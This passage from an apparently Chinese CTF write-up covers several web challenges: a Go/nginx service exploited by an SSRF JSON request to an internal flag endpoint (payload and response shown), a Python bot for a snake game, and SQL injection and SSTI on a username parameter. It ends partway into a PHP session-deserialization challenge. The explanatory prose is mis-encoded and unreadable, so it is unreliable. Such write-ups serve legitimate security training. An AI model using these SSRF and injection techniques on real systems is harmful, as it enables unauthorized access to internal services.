class="line">v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">v1.POST(<span class="string">&quot;/api/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">flag, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¯»å– flag æ–‡ä»¶ï¼Œ ç„¶åè¿”å›è¾“å‡ºã€‚</p><p>â€‹ <code>/v2/api/proxy</code>  å­˜åœ¨ ssrfã€‚ç›´æ¥è®¿é—® flag æ— æ³•è®¿é—®ï¼Œå› æ­¤éœ€è¦ ssrfã€‚</p><p>â€‹æ­£å¥½ï¼Œç»™äº†é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server <span class="punctuation">&#123;</span></span><br><span class="line">    listen <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">    location ~ /v1 <span class="punctuation">&#123;</span></span><br><span class="line">        return <span class="number">403</span>;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    location ~ /v2 <span class="punctuation">&#123;</span></span><br><span class="line">        proxy_pass http<span class="punctuation">:</span><span class="comment">//localhost:8769;</span></span><br><span class="line">        proxy_http_version <span class="number">1.1</span>;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection $connection_upgrade;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹æ ¹æ® <code>proxy_set_header X-Real-IP $remote_addr;</code> , å¯ä»¥ç¡®å®šèƒ½æ‰“ ssrfã€‚</p><p>â€‹/v2/api/proxy æ˜¯ä»¥ json å½¢å¼å‘åŒ…çš„ï¼Œå¯ä»¥æï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/v2/api/proxy</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.107.225.62:30903</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>142</span><br><span class="line"></span><br><span class="line"><span class="language-css">&#123;&quot;url&quot;:<span class="string">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span>,<span class="string">&quot;method&quot;</span>:<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;headers&quot;</span>:&#123;&quot;<span class="attribute">Content</span>-Type&quot;:<span class="string">&quot;application/json&quot;</span>&#125;,&quot;<span class="selector-tag">body</span>&quot;:<span class="string">&quot;&quot;</span>,<span class="string">&quot;follow_redirects&quot;</span>:false</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹å“åº”ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.27.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 03 Nov 2024 07:11:08 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>67</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="string">&quot;ZmxhZ3tkM2MxNzZjZC05ZjhiLTRlOWQtOWM3Yi1mYzgyZTUxYzUwOTd9&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><h2 id="snake"><a class="markdownIt-Anchor" href="#snake">#</a> snakeï¼š</h2><p>â€‹æ‰“æ¸¸æˆï¼Œå†™ä¸ªè„šæœ¬å»è·‘ï¼Œå…ˆå®¡ jsï¼Œå‘ç°äº†ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚ move è·¯ç”±ä»€ä¹ˆçš„ï¼Œç›´æ¥æ‹¿å»å†™è„šæœ¬ï¼Œç½‘ä¸Šæ‰¾äº†ä¸€åœˆï¼Œæ‰¾åˆ°ä¸€äº›ç®—æ³•ï¼Œ éƒ½æ”¹ä¸€æ”¹æ‹¿å»è¯•ï¼Œæœ€åè¿™ä¸ªèƒ½è·‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹æ–¹å‘</span></span><br><span class="line">current_direction = <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze4zqdxex49cesyexgc.cloudeci1.ichunqiu.com:5000/move&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€æ–¹å‘è¯·æ±‚å¹¶è·å–æ¸¸æˆçŠ¶æ€</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_direction_and_get_state</span>(<span class="params">direction</span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=eyJ1c2VybmFtZSI6ImcwMWRlbiJ9.ZycoKQ.BlD0y752_1q7iLu3ZVk5tsO6fKo&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = json.dumps(&#123;<span class="string">&quot;direction&quot;</span>: direction&#125;)</span><br><span class="line">    response = requests.post(url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f&quot;Failed to send direction: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response:&quot;</span>, response.json())</span><br><span class="line">    <span class="keyword">return</span> response.json()</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—æ›¼å“ˆé¡¿è·ç¦»</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heuristic</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(a[<span class="number">0</span>] - b[<span class="number">0</span>]) + <span class="built_in">abs</span>(a[<span class="number">1</span>] - b[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># A* å¯»è·¯ç®—æ³•</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a_star_search</span>(<span class="params">start, goal, snake</span>):</span><br><span class="line">    open_set = []</span><br><span class="line">    heapq.heappush(open_set, (<span class="number">0</span>, start))</span><br><span class="line">    came_from = &#123;&#125;</span><br><span class="line">    g_score = &#123;<span class="built_in">tuple</span>(start): <span class="number">0</span>&#125;</span><br><span class="line">    f_score = &#123;<span class="built_in">tuple</span>(start): heuristic(start, goal)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> open_set:</span><br><span class="line">        _, current = heapq.heappop(open_set)</span><br><span class="line">        current = <span class="built_in">tuple</span>(current)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current == <span class="built_in">tuple</span>(goal):</span><br><span class="line">            path = []</span><br><span class="line">            <span class="keyword">while</span> current <span class="keyword">in</span> came_from:</span><br><span class="line">                path.append(current)</span><br><span class="line">                current = came_from[current]</span><br><span class="line">            path.reverse()</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line">        neighbors = [</span><br><span class="line">            (current[<span class="number">0</span>] + <span class="number">1</span>, current[<span class="number">1</span>]),  <span class="comment"># RIGHT</span></span><br><span class="line">            (current[<span class="number">0</span>] - <span class="number">1</span>, current[<span class="number">1</span>]),  <span class="comment"># LEFT</span></span><br><span class="line">            (current[<span class="number">0</span>], current[<span class="number">1</span>] + <span class="number">1</span>),  <span class="comment"># DOWN</span></span><br><span class="line">            (current[<span class="number">0</span>], current[<span class="number">1</span>] - <span class="number">1</span>)   <span class="comment"># UP</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> neighbor <span class="keyword">in</span> neighbors:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= neighbor[<span class="number">0</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= neighbor[<span class="number">1</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="built_in">list</span>(neighbor) <span class="keyword">not</span> <span class="keyword">in</span> snake:</span><br><span class="line">                tentative_g_score = g_score[<span class="built_in">tuple</span>(current)] + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">tuple</span>(neighbor) <span class="keyword">not</span> <span class="keyword">in</span> g_score <span class="keyword">or</span> tentative_g_score &lt; g_score[<span class="built_in">tuple</span>(neighbor)]:</span><br><span class="line">                    came_from[<span class="built_in">tuple</span>(neighbor)] = current</span><br><span class="line">                    g_score[<span class="built_in">tuple</span>(neighbor)] = tentative_g_score</span><br><span class="line">                    f_score[<span class="built_in">tuple</span>(neighbor)] = tentative_g_score + heuristic(neighbor, goal)</span><br><span class="line">                    heapq.heappush(open_set, (f_score[<span class="built_in">tuple</span>(neighbor)], neighbor))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—ä¸‹ä¸€æ­¥çš„æ–¹å‘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_next_direction</span>(<span class="params">snake, food, current_direction</span>):</span><br><span class="line">    head = snake[<span class="number">0</span>]</span><br><span class="line">    path = a_star_search(head, food, snake)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> path:</span><br><span class="line">        next_head = path[<span class="number">0</span>]</span><br><span class="line">        x_diff = next_head[<span class="number">0</span>] - head[<span class="number">0</span>]</span><br><span class="line">        y_diff = next_head[<span class="number">1</span>] - head[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x_diff == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> x_diff == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;LEFT&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> y_diff == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;DOWN&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> y_diff == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;UP&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¦‚æœæ‰¾ä¸åˆ°è·¯å¾„ï¼Œéšæœºé€‰æ‹©ä¸€ä¸ªå®‰å…¨çš„æ–¹å‘</span></span><br><span class="line">    possible_directions = [<span class="string">&#x27;UP&#x27;</span>, <span class="string">&#x27;DOWN&#x27;</span>, <span class="string">&#x27;LEFT&#x27;</span>, <span class="string">&#x27;RIGHT&#x27;</span>]</span><br><span class="line">    opposite_directions = &#123;<span class="string">&#x27;UP&#x27;</span>: <span class="string">&#x27;DOWN&#x27;</span>, <span class="string">&#x27;DOWN&#x27;</span>: <span class="string">&#x27;UP&#x27;</span>, <span class="string">&#x27;LEFT&#x27;</span>: <span class="string">&#x27;RIGHT&#x27;</span>, <span class="string">&#x27;RIGHT&#x27;</span>: <span class="string">&#x27;LEFT&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> direction <span class="keyword">in</span> possible_directions:</span><br><span class="line">        <span class="keyword">if</span> direction == opposite_directions[current_direction]:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># ä¸é€‰æ‹©ç›¸åæ–¹å‘</span></span><br><span class="line"></span><br><span class="line">        next_head = &#123;</span><br><span class="line">            <span class="string">&#x27;UP&#x27;</span>: [head[<span class="number">0</span>], head[<span class="number">1</span>] - <span class="number">1</span>],</span><br><span class="line">            <span class="string">&#x27;DOWN&#x27;</span>: [head[<span class="number">0</span>], head[<span class="number">1</span>] + <span class="number">1</span>],</span><br><span class="line">            <span class="string">&#x27;LEFT&#x27;</span>: [head[<span class="number">0</span>] - <span class="number">1</span>, head[<span class="number">1</span>]],</span><br><span class="line">            <span class="string">&#x27;RIGHT&#x27;</span>: [head[<span class="number">0</span>] + <span class="number">1</span>, head[<span class="number">1</span>]]</span><br><span class="line">        &#125;[direction]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= next_head[<span class="number">0</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= next_head[<span class="number">1</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> next_head <span class="keyword">not</span> <span class="keyword">in</span> snake:</span><br><span class="line">            <span class="keyword">return</span> direction</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¦‚æœæ‰€æœ‰æ–¹å‘éƒ½ä¼šå¯¼è‡´ç¢°æ’ï¼Œè¿”å›å½“å‰æ–¹å‘</span></span><br><span class="line">    <span class="keyword">return</span> current_direction</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»å¾ªç¯</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_loop</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># åˆå§‹åŒ–æ¸¸æˆçŠ¶æ€</span></span><br><span class="line">        game_state = send_direction_and_get_state(<span class="string">&#x27;RIGHT&#x27;</span>)</span><br><span class="line">        snake = game_state[<span class="string">&#x27;snake&#x27;</span>]</span><br><span class="line">        food = game_state[<span class="string">&#x27;food&#x27;</span>]</span><br><span class="line">        score = game_state[<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">        current_direction = <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># è®¡ç®—ä¸‹ä¸€æ­¥çš„æ–¹å‘</span></span><br><span class="line">            next_direction = calculate_next_direction(snake, food, current_direction)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># å‘é€æ–¹å‘è¯·æ±‚å¹¶è·å–æ–°çš„æ¸¸æˆçŠ¶æ€</span></span><br><span class="line">            game_state = send_direction_and_get_state(next_direction)</span><br><span class="line">            snake = game_state[<span class="string">&#x27;snake&#x27;</span>]</span><br><span class="line">            food = game_state[<span class="string">&#x27;food&#x27;</span>]</span><br><span class="line">            new_score = game_state[<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">            status = game_state[<span class="string">&#x27;status&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ›´æ–°æ–¹å‘</span></span><br><span class="line">            current_direction = next_direction</span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ‰“å°å½“å‰çŠ¶æ€</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Current direction: <span class="subst">&#123;next_direction&#125;</span>, Snake: <span class="subst">&#123;snake&#125;</span>, Food: <span class="subst">&#123;food&#125;</span>, Score: <span class="subst">&#123;new_score&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> status != <span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Game over with status: <span class="subst">&#123;status&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ç¨‹åºå·²é€€å‡º&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main_loop()</span><br></pre></td></tr></table></figure><p>â€‹æœ€åå¾—åˆ°äº†è¿™ä¸ªï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response<span class="punctuation">:</span> <span class="punctuation">&#123;</span>&#x27;status&#x27;<span class="punctuation">:</span> &#x27;win&#x27;<span class="punctuation">,</span> &#x27;url&#x27;<span class="punctuation">:</span> &#x27;/snake_win?username=g01den&#x27;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè®¿é—®è¿™ä¸ªè·¯ç”±ï¼Œæ„Ÿè§‰æ€ªæ€ªçš„ï¼Œæ²¡æœ‰ flagï¼Œå‘ç° username çš„å‚æ•°ç›´æ¥è¢«æ‰“å°äº†ï¼Œæµ‹ä¸€æµ‹ sstiï¼Œå¤±è´¥äº†ï¼Œå®Œè›‹ã€‚æˆ–è€…è¯´ï¼Œè¯•è¯•çœ‹ sql æ³¨å…¥ï¼Œèƒ½æˆåŠŸï¼Œæœ€åæ‰¾åˆ°äº†åˆ—æ•°ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5084599173804427bdc3b1a2353bcb7a.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹èƒ½å‡ºï¼Œä¸è¿‡ï¼Œæˆ‘ä¸ç†è§£ä¸ºå•¥è¿™é‡Œä¹Ÿèƒ½å‡º sstiï¼Ÿè¯·çœ‹ VCRï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/32ea45b9656242ed8fde7ea072d05877.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿™ä¸ªæºç å±‚é¢å’‹å®ç°çš„ï¼Ÿæœ‰ç‚¹åˆé’»äº†ï¼Œç®—äº†ï¼Œç›´æ¥å—¦ï¼ˆè¿™é‡Œè¢«å½“ä½œ html æ‰§è¡Œäº†ï¼Œæ‰€ä»¥çœ‹ä¸åˆ°ï¼‰ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/6f915faccad24280a7fc245b46464a92.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img data-src="https://i-blog.csdnimg.cn/direct/80af9bc9b43b4694941b70507ec7d561.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¾—åˆ° flagã€‚</p><h2 id="platformå¤ç°"><a class="markdownIt-Anchor" href="#platformå¤ç°">#</a> platformï¼ˆå¤ç°ï¼‰ï¼š</h2><p>â€‹www.zip æ³„éœ²ï¼Œindexï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sessionManager</span> = <span class="keyword">new</span> <span class="title class_">SessionManager</span>();</span><br><span class="line"><span class="variable">$SessionRandom</span> = <span class="keyword">new</span> <span class="title class_">SessionRandom</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;session_key&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;session_key&#x27;</span>] =<span class="variable">$SessionRandom</span> -&gt; <span class="title function_ invoke__">generateRandomString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="variable">$password</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$sessionManager</span>-&gt;<span class="title function_ invoke__">filterSensitiveFunctions</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: dashboard.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;login.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å­˜åœ¨ <code>session_start();</code> ï¼Œä¼°æ‘¸ç€æœ‰ session ååºåˆ—åŒ–ï¼Œå…ˆè®°å½•ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionRandom</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$charactersLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>);</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="variable">$charactersLength</span> - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ <code>['session_key']</code>  é•¿åº¦æ˜¯ 1 åˆ° 50 